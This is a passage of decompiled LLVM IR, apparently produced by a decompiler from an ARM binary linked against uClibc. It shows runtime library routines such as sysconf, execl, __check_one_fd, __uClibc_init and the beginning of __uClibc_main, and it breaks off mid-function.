  %v1_18090 = inttoptr i32 %v0_1808c to i32*
  %v2_18090 = call i32 @__GI_config_close(i32* %v1_18090)
  %v0_18094 = load i32, i32* @r5, align 4
  %v2_18094 = icmp eq i32 %v0_18094, 0
  %.v0_18094 = select i1 %v2_18094, i32 1, i32 %v0_18094
  ret i32 %.v0_18094

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_1808c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_184b8

bb:                                               ; preds = %entry
  %v7_180e4 = mul i32 %arg1, 4
  %v8_180e4 = add i32 %v7_180e4, ptrtoint (i32* @global_var_180ec.1484 to i32)
  call void @__pseudo_branch(i32 %v8_180e4)
  br label %dec_label_pc_184b8

dec_label_pc_184b8:                               ; preds = %bb, %entry
  %v0_184b8 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_184c4 = inttoptr i32 %v0_184b8 to i32*
  store i32 22, i32* %v2_184c4, align 4
  %v0_18674 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_18674

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_186a8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_186a8, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_186bc = ptrtoint i32* %stack_var_-40 to i32
  %v2_186c0 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_186d0

dec_label_pc_186d0:                               ; preds = %dec_label_pc_186d0, %entry
  %v0_186e4 = phi i32 [ 0, %entry ], [ %v1_186e4, %dec_label_pc_186d0 ]
  %stack_var_-36.0 = phi i32 [ %v2_186c0, %entry ], [ %v1_186d8, %dec_label_pc_186d0 ]
  %v1_186d4 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_186d4 = load i32, i32* %v1_186d4, align 4
  %v1_186d8 = add i32 %stack_var_-36.0, 4
  %v2_186dc = icmp eq i32 %v2_186d4, 0
  %v1_186e4 = add i32 %v0_186e4, 1
  store i32 %v1_186e4, i32* @lr, align 4
  br i1 %v2_186dc, label %dec_label_pc_186ec, label %dec_label_pc_186d0

dec_label_pc_186ec:                               ; preds = %dec_label_pc_186d0
  %v3_186ec = mul i32 %v1_186e4, 4
  %v1_186f0 = add i32 %v3_186ec, 18
  %v1_186f4 = and i32 %v1_186f0, -8
  %v2_186f8 = sub i32 %v2_186bc, %v1_186f4
  %v2_18700 = inttoptr i32 %v2_186f8 to i32*
  store i32 %arg2, i32* %v2_18700, align 4
  %v0_1870c = load i32, i32* @sp, align 4
  store i32 %v0_1870c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18714

dec_label_pc_18714:                               ; preds = %dec_label_pc_18714, %dec_label_pc_186ec
  %v1_18728 = phi i32 [ %v0_1870c, %dec_label_pc_186ec ], [ %v5_18728, %dec_label_pc_18714 ]
  %stack_var_-36.1 = phi i32 [ %v2_186c0, %dec_label_pc_186ec ], [ %v1_18720, %dec_label_pc_18714 ]
  %v1_18718 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_18718 = load i32, i32* %v1_18718, align 4
  %v0_1871c = load i32, i32* @lr, align 4
  %v1_1871c = add i32 %v0_1871c, -1
  store i32 %v1_1871c, i32* @lr, align 4
  %v7_1871c = icmp eq i32 %v0_1871c, 1
  %v1_18720 = add i32 %stack_var_-36.1, 4
  %v2_18728 = add i32 %v1_18728, 4
  %v3_18728 = inttoptr i32 %v2_18728 to i32*
  store i32 %v2_18718, i32* %v3_18728, align 4
  %v4_18728 = load i32, i32* %ip.global-to-local, align 4
  %v5_18728 = add i32 %v4_18728, 4
  store i32 %v5_18728, i32* %ip.global-to-local, align 4
  br i1 %v7_1871c, label %dec_label_pc_18730, label %dec_label_pc_18714

dec_label_pc_18730:                               ; preds = %dec_label_pc_18714
  %v0_1873c = call i32 @__GI_execve()
  ret i32 %v0_1873c

; uselistorder directives
  uselistorder i32 %v5_18728, { 1, 0 }
  uselistorder i32 %v0_1871c, { 1, 0 }
  uselistorder i32 %v1_186e4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_18764 = add i32 %tmp, 4
  %v4_18764 = inttoptr i32 %v3_18764 to i32*
  store i32 %arg3, i32* %v4_18764, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_18770 = icmp eq i32 %arg2, 0
  br i1 %v2_18770, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1877c = add i32 %tmp, 4
  %v3_1877c = inttoptr i32 %v2_1877c to i32*
  %v4_1877c = load i32, i32* %v3_1877c, align 4
  store i32 %v4_1877c, i32* %r0.global-to-local, align 4
  %v3_18780 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_18780, %bb ], [ undef, %entry ]
  %v2_18788 = xor i1 %v2_18770, true
  call void @__pseudo_cond_branch(i1 %v2_18788, i32 %.02)
  %v1_18794 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18794

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_187bc.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18798 = load i32, i32* @r4, align 4
  store i32 %v3_18798, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -28), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_187bc

dec_label_pc_187bc:                               ; preds = %dec_label_pc_187bc.dec_label_pc_187bc_crit_edge, %dec_label_pc_187bc.lr.ph
  %v1_187bc = phi i32 [ %v1_187c8, %dec_label_pc_187bc.dec_label_pc_187bc_crit_edge ], [ 0, %dec_label_pc_187bc.lr.ph ]
  %v0_187bc = phi i32 [ %v0_187bc.pre, %dec_label_pc_187bc.dec_label_pc_187bc_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -28), %dec_label_pc_187bc.lr.ph ]
  %v4_187bc = mul i32 %v1_187bc, 4
  %v5_187bc = add i32 %v4_187bc, %v0_187bc
  %v6_187bc = inttoptr i32 %v5_187bc to i32*
  %v7_187bc = load i32, i32* %v6_187bc, align 4
  call void @__pseudo_branch(i32 %v7_187bc)
  %v0_187c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_187c8 = add i32 %v0_187c8, -1
  store i32 %v1_187c8, i32* %r4.global-to-local, align 4
  %v2_187c8 = icmp eq i32 %v0_187c8, 0
  br i1 %v2_187c8, label %dec_label_pc_187d0, label %dec_label_pc_187bc.dec_label_pc_187bc_crit_edge

dec_label_pc_187bc.dec_label_pc_187bc_crit_edge:  ; preds = %dec_label_pc_187bc
  %v0_187bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_187bc

dec_label_pc_187d0:                               ; preds = %dec_label_pc_187bc
  %v0_187d4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_187d4 = add i32 %v0_187d4.pre, 26340
  %v3_187d4 = inttoptr i32 %v2_187d4 to i32*
  %v4_187d4 = load i32, i32* %v3_187d4, align 4
  %v2_187d8 = icmp eq i32 %v4_187d4, 0
  br i1 %v2_187d8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_187d0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_187d0, %bb
  %v2_187e0 = xor i1 %v2_187d8, true
  call void @__pseudo_cond_branch(i1 %v2_187e0, i32 %v4_187d4)
  %v0_187e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_187e8 = add i32 %v0_187e8, 26344
  %v3_187e8 = inttoptr i32 %v2_187e8 to i32*
  %v4_187e8 = load i32, i32* %v3_187e8, align 4
  %v2_187ec = icmp eq i32 %v4_187e8, 0
  br i1 %v2_187ec, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_187f4 = xor i1 %v2_187ec, true
  call void @__pseudo_cond_branch(i1 %v2_187f4, i32 %v4_187e8)
  %v2_187f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_187f8, i32* %r4.global-to-local, align 4
  %v1_187fc = load i32, i32* @r0, align 4
  ret i32 %v1_187fc

; uselistorder directives
  uselistorder i32 %v1_187c8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_18828 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_18830 = icmp eq i32 %v2_18828, -1
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r3, align 4
  br i1 %v3_18830, label %dec_label_pc_1883c, label %dec_label_pc_18854

dec_label_pc_1883c:                               ; preds = %entry
  %v0_18840 = load i32, i32* %r5.global-to-local, align 4
  %v2_18848 = call i32 @__GI_open(i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34300), i32 %v0_18840)
  %v1_1884c = load i32, i32* %r4.global-to-local, align 4
  %v1_18850 = icmp ne i32 %v2_18848, %v1_1884c
  call void @__pseudo_cond_branch(i1 %v1_18850, i32 ptrtoint (i32* @global_var_174f4.1503 to i32))
  br label %dec_label_pc_18854

dec_label_pc_18854:                               ; preds = %entry, %dec_label_pc_1883c
  %v1_1885c = phi i32 [ %v2_18828, %entry ], [ %v2_18848, %dec_label_pc_1883c ]
  ret i32 %v1_1885c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_18854, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r4.global-to-local, align 4
  %v4_18878 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 104) to i32*), align 4
  %v1_1887c = inttoptr i32 %v4_18878 to i32*
  %v2_1887c = load i32, i32* %v1_1887c, align 4
  %v2_18880 = icmp eq i32 %v2_1887c, 0
  br i1 %v2_18880, label %dec_label_pc_18888, label %dec_label_pc_188bc

dec_label_pc_18888:                               ; preds = %entry
  %v4_1888c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 60) to i32*), align 4
  %v2_18894 = icmp eq i32 %v4_1888c, 0
  store i32 4096, i32* %v1_1887c, align 4
  br i1 %v2_18894, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_18888
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_18888, %bb
  %v2_188a0 = xor i1 %v2_18894, true
  call void @__pseudo_cond_branch(i1 %v2_188a0, i32 %v4_1888c)
  %v0_188a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_188a8 = add i32 %v0_188a8, -105104
  %v2_188b0 = icmp eq i32 %v2_188a8, 0
  br i1 %v2_188b0, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_188b8 = xor i1 %v2_188b0, true
  call void @__pseudo_cond_branch(i1 %v2_188b8, i32 %v2_188a8)
  br label %dec_label_pc_188bc

dec_label_pc_188bc:                               ; preds = %entry, %bb6
  %v1_188c0 = load i32, i32* @r0, align 4
  ret i32 %v1_188c0

; uselistorder directives
  uselistorder label %dec_label_pc_188bc, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_188dc = add i32 %tmp, 4
  store i32 %v1_188dc, i32* %ip.global-to-local, align 4
  %v2_188e0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  %v3_188ec = mul i32 %arg2, 4
  store i32 %v3_188ec, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_188f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 24) to i32*), align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_188fc = ptrtoint i32* %stack_var_-120 to i32
  %v4_18900 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 32) to i32*), align 4
  store i32 %v4_18900, i32* %r4.global-to-local, align 4
  %v2_18908 = add i32 %v1_188dc, %v3_188ec
  store i32 %v2_18908, i32* %ip.global-to-local, align 4
  %v9_1890c = icmp eq i32 %v2_18908, %v2_188e0
  store i1 %v9_1890c, i1* %cpsr_z.global-to-local, align 1
  %v2_18910 = inttoptr i32 %v4_188f4 to i32*
  store i32 %arg7, i32* %v2_18910, align 4
  store i32 26344, i32* %r2.global-to-local, align 4
  %v0_1891c = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_1890c, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_18920 = load i32, i32* @r7, align 4
  %v2_18920 = load i32, i32* %r5.global-to-local, align 4
  %v3_18920 = add i32 %v2_18920, %v1_18920
  store i32 %v3_18920, i32* %r3.global-to-local, align 4
  %v1_18924 = load i32, i32* @r6, align 4
  %v3_18924 = add i32 %v1_18924, 26344
  %v4_18924 = inttoptr i32 %v3_18924 to i32*
  store i32 %arg6, i32* %v4_18924, align 4
  %v0_18928 = load i32, i32* %ip.global-to-local, align 4
  %v1_18928 = load i32, i32* %r4.global-to-local, align 4
  %v2_18928 = inttoptr i32 %v1_18928 to i32*
  store i32 %v0_18928, i32* %v2_18928, align 4
  store i32 120, i32* @r2, align 4
  %v1_18934 = load i32, i32* %r3.global-to-local, align 4
  %v2_18934 = load i32, i32* %r4.global-to-local, align 4
  %v3_18934 = inttoptr i32 %v2_18934 to i32*
  store i32 %v1_18934, i32* %v3_18934, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_18924.c = load i32, i32* @r6, align 4
  %v3_18924.c = add i32 %v1_18924.c, 26344
  %v4_18924.c = inttoptr i32 %v3_18924.c to i32*
  store i32 %arg6, i32* %v4_18924.c, align 4
  %v0_18928.c = load i32, i32* %ip.global-to-local, align 4
  %v1_18928.c = load i32, i32* %r4.global-to-local, align 4
  %v2_18928.c = inttoptr i32 %v1_18928.c to i32*
  store i32 %v0_18928.c, i32* %v2_18928.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  %v2_18940 = bitcast i32* %stack_var_-120 to i8*
  %v3_18940 = call i32 @__GI_memset(i8* %v2_18940, i32 0)
  %v0_18944 = load i32, i32* %r4.global-to-local, align 4
  %v1_18944 = inttoptr i32 %v0_18944 to i32*
  %storemerge.pre = load i32, i32* %v1_18944, align 4
  br label %dec_label_pc_18950

dec_label_pc_18950:                               ; preds = %dec_label_pc_18950, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_18950, %dec_label_pc_18950 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_18950 = inttoptr i32 %storemerge to i32*
  %v2_18950 = load i32, i32* %v1_18950, align 4
  store i32 %v2_18950, i32* %r3.global-to-local, align 4
  %v4_18950 = add i32 %storemerge, 4
  store i32 %v4_18950, i32* %r2.global-to-local, align 4
  %v2_18954 = icmp eq i32 %v2_18950, 0
  br i1 %v2_18954, label %dec_label_pc_18960, label %dec_label_pc_18950

dec_label_pc_18960:                               ; preds = %dec_label_pc_18950
  store i32 %v4_18950, i32* @r4, align 4
  store i32 %v2_188fc, i32* @r5, align 4
  %v1_1898429 = inttoptr i32 %v4_18950 to i32*
  %v2_1898430 = load i32, i32* %v1_1898429, align 4
  store i32 %v2_1898430, i32* %r3.global-to-local, align 4
  %v2_1898832 = icmp eq i32 %v2_1898430, 0
  store i1 %v2_1898832, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1898832, label %dec_label_pc_18990, label %dec_label_pc_1896c

dec_label_pc_1896c:                               ; preds = %dec_label_pc_18960, %dec_label_pc_18984
  %v5_18970 = phi i32 [ %v2_18984, %dec_label_pc_18984 ], [ %v2_1898430, %dec_label_pc_18960 ]
  %v2_1896c = icmp ugt i32 %v5_18970, 13
  %v7_1896c = icmp eq i32 %v5_18970, 14
  store i1 %v7_1896c, i1* %cpsr_z.global-to-local, align 1
  %v2_18970 = xor i1 %v2_1896c, true
  %v3_18970 = or i1 %v7_1896c, %v2_18970
  br i1 %v3_18970, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_1896c
  %v6_18970 = and i32 %v5_18970, 536870912
  %v7_18970 = icmp ne i32 %v6_18970, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_1896c, %bb59
  %v1_1897c = phi i1 [ %v2_1896c, %dec_label_pc_1896c ], [ %v7_18970, %bb59 ]
  %v2_18974 = xor i1 %v1_1897c, true
  %v3_18974 = or i1 %v7_1896c, %v2_18974
  br i1 %v3_18974, label %bb61, label %dec_label_pc_18984

bb61:                                             ; preds = %bb60
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18984

dec_label_pc_18984:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_18974, i32 ptrtoint (i32* @global_var_15a50.1513 to i32))
  %v0_18980 = load i32, i32* @r4, align 4
  %v1_18980 = add i32 %v0_18980, 8
  store i32 %v1_18980, i32* @r4, align 4
  %v1_18984 = inttoptr i32 %v1_18980 to i32*
  %v2_18984 = load i32, i32* %v1_18984, align 4
  store i32 %v2_18984, i32* %r3.global-to-local, align 4
  %v2_18988 = icmp eq i32 %v2_18984, 0
  store i1 %v2_18988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18988, label %dec_label_pc_18990, label %dec_label_pc_1896c

dec_label_pc_18990:                               ; preds = %dec_label_pc_18984, %dec_label_pc_18960
  %v1_18994 = call i32 @_dl_aux_init(i32 %v2_188fc)
  store i32 %v1_18994, i32* @r0, align 4
  %v1_18998 = call i32 @__GI___uClibc_init(i32 %v1_18994)
  store i32 %v1_18998, i32* @r0, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_189a4 = load i32, i32* @r6, align 4
  %v2_189a4 = add i32 %v0_189a4, 104
  %v3_189a4 = inttoptr i32 %v2_189a4 to i32*
  %v4_189a4 = load i32, i32* %v3_189a4, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_189ac = icmp eq i32 %tmp54, 0
  store i1 %v2_189ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189ac, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_18990
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_18990, %bb62
  %v0_189b8 = phi i32 [ %tmp54, %dec_label_pc_18990 ], [ 4096, %bb62 ]
  %v3_189b4 = icmp eq i32 %tmp53, -1
  %v8_189b4 = icmp eq i32 %tmp53, -1
  store i1 %v8_189b4, i1* %cpsr_z.global-to-local, align 1
  %v2_189b8 = inttoptr i32 %v4_189a4 to i32*
  store i32 %v0_189b8, i32* %v2_189b8, align 4
  br i1 %v3_189b4, label %dec_label_pc_189c0, label %dec_label_pc_189e8

dec_label_pc_189c0:                               ; preds = %bb63
  %v0_189c0 = call i32 @getuid()
  store i32 %v0_189c0, i32* @r0, align 4
  store i32 %v0_189c0, i32* @r4, align 4
  %v0_189c8 = call i32 @geteuid()
  store i32 %v0_189c8, i32* @r0, align 4
  %v0_189cc = load i32, i32* @r4, align 4
  %v9_189cc = icmp eq i32 %v0_189cc, %v0_189c8
  store i1 %v9_189cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_189cc, label %dec_label_pc_189d4, label %dec_label_pc_18a10

dec_label_pc_189d4:                               ; preds = %dec_label_pc_189c0
  %v1_189d4 = call i32 @getgid(i32 %v0_189c8)
  store i32 %v1_189d4, i32* @r0, align 4
  store i32 %v1_189d4, i32* @r4, align 4
  %v0_189dc = call i32 @getegid()
  store i32 %v0_189dc, i32* @r0, align 4
  %v0_189e0 = load i32, i32* @r4, align 4
  %v9_189e0 = icmp eq i32 %v0_189e0, %v0_189dc
  store i1 %v9_189e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_189e0, label %dec_label_pc_189e8, label %dec_label_pc_18a10

dec_label_pc_189e8:                               ; preds = %dec_label_pc_189d4, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_189b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_189b4, label %dec_label_pc_18a34, label %dec_label_pc_189f4

dec_label_pc_189f4:                               ; preds = %dec_label_pc_189e8
  store i32 %tmp52, i32* @r3, align 4
  %v9_189f8 = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_189f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_189f8, label %dec_label_pc_18a00, label %dec_label_pc_18a10

dec_label_pc_18a00:                               ; preds = %dec_label_pc_189f4
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_18a08 = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_18a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18a08, label %dec_label_pc_18a34, label %dec_label_pc_18a10

dec_label_pc_18a10:                               ; preds = %dec_label_pc_189f4, %dec_label_pc_189d4, %dec_label_pc_189c0, %dec_label_pc_18a00
  %v2_18a18 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_18a24 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_18a30 = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_18a30, i32* @r0, align 4
  br label %dec_label_pc_18a34

dec_label_pc_18a34:                               ; preds = %dec_label_pc_18a00, %dec_label_pc_189e8, %dec_label_pc_18a10
  %v0_18a34 = load i32, i32* @r7, align 4
  %v1_18a34 = inttoptr i32 %v0_18a34 to i32*
  %v2_18a34 = load i32, i32* %v1_18a34, align 4
  store i32 %v2_18a34, i32* %r2.global-to-local, align 4
  store i32 1156, i32* %r3.global-to-local, align 4
  %v1_18a3c = load i32, i32* @r6, align 4
  %v3_18a3c = add i32 %v1_18a3c, 1156
  %v4_18a3c = inttoptr i32 %v3_18a3c to i32*
  store i32 %v2_18a34, i32* %v4_18a3c, align 4
  %v0_18a40 = load i32, i32* @r7, align 4
  %v1_18a40 = inttoptr i32 %v0_18a40 to i32*
  %v2_18a40 = load i32, i32* %v1_18a40, align 4
  store i32 %v2_18a40, i32* @r4, align 4
  %v2_18a44 = icmp eq i32 %v2_18a40, 0
  store i1 %v2_18a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a44, label %bb65, label %dec_label_pc_18a4c

dec_label_pc_18a4c:                               ; preds = %dec_label_pc_18a34
  store i32 124, i32* %r3.global-to-local, align 4
  %v0_18a50 = load i32, i32* @r6, align 4
  %v2_18a50 = add i32 %v0_18a50, 124
  %v3_18a50 = inttoptr i32 %v2_18a50 to i32*
  %v4_18a50 = load i32, i32* %v3_18a50, align 4
  store i32 %v4_18a50, i32* %r3.global-to-local, align 4
  %v2_18a54 = inttoptr i32 %v4_18a50 to i32*
  store i32 %v2_18a40, i32* %v2_18a54, align 4
  %v0_18a5c = load i32, i32* @r7, align 4
  %v1_18a5c = inttoptr i32 %v0_18a5c to i32*
  %v2_18a5c = load i32, i32* %v1_18a5c, align 4
  %v4_18a60 = call i32 @__GI_strrchr(i32 %v2_18a5c, i32 47, i32 %v2_18a34, i32 %v4_18a50)
  store i32 %v4_18a60, i32* @r0, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v2_18a68 = icmp eq i32 %v4_18a60, 0
  store i1 %v2_18a68, i1* %cpsr_z.global-to-local, align 1
  %v0_18a6c = load i32, i32* @r6, align 4
  %v2_18a6c = add i32 %v0_18a6c, 68
  %v3_18a6c = inttoptr i32 %v2_18a6c to i32*
  %v4_18a6c = load i32, i32* %v3_18a6c, align 4
  store i32 %v4_18a6c, i32* %r2.global-to-local, align 4
  br i1 %v2_18a68, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_18a4c
  %v2_18a7448 = inttoptr i32 %v4_18a6c to i32*
  store i32 0, i32* %v2_18a7448, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_18a4c
  %v2_18a70 = add i32 %v4_18a60, 1
  store i32 %v2_18a70, i32* %r3.global-to-local, align 4
  %v2_18a74 = inttoptr i32 %v4_18a6c to i32*
  store i32 %v4_18a60, i32* %v2_18a74, align 4
  %v1_18a78 = load i32, i32* %r3.global-to-local, align 4
  %v2_18a78 = load i32, i32* %r2.global-to-local, align 4
  %v3_18a78 = inttoptr i32 %v2_18a78 to i32*
  store i32 %v1_18a78, i32* %v3_18a78, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_18a34
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_18a90 = load i32, i32* @r6, align 4
  %v2_18a90 = add i32 %v0_18a90, -32
  store i32 %v2_18a90, i32* %r8.global-to-local, align 4
  store i32 26340, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_18aa0 = add i32 %v0_18a90, 26340
  %v4_18aa0 = inttoptr i32 %v3_18aa0 to i32*
  store i32 %arg5, i32* %v4_18aa0, align 4
  %v0_18ab817 = load i32, i32* %r4.global-to-local, align 4
  %v1_18ab818 = load i32, i32* %r5.global-to-local, align 4
  %v3_18ab820 = icmp ult i32 %v0_18ab817, %v1_18ab818
  %v9_18ab826 = icmp eq i32 %v0_18ab817, %v1_18ab818
  store i1 %v9_18ab826, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18ab820, label %dec_label_pc_18aa8, label %dec_label_pc_18ae8.lr.ph

dec_label_pc_18aa8:                               ; preds = %dec_label_pc_18aa8, %bb65
  %v1_18aa8 = phi i32 [ %v1_18ab4, %dec_label_pc_18aa8 ], [ %v0_18ab817, %bb65 ]
  %v0_18aa8 = load i32, i32* %r8.global-to-local, align 4
  %v4_18aa8 = mul i32 %v1_18aa8, 4
  %v5_18aa8 = add i32 %v4_18aa8, %v0_18aa8
  %v6_18aa8 = inttoptr i32 %v5_18aa8 to i32*
  %v7_18aa8 = load i32, i32* %v6_18aa8, align 4
  store i32 %v7_18aa8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_18aa8)
  %v0_18ab4 = load i32, i32* %r4.global-to-local, align 4
  %v1_18ab4 = add i32 %v0_18ab4, 1
  store i32 %v1_18ab4, i32* %r4.global-to-local, align 4
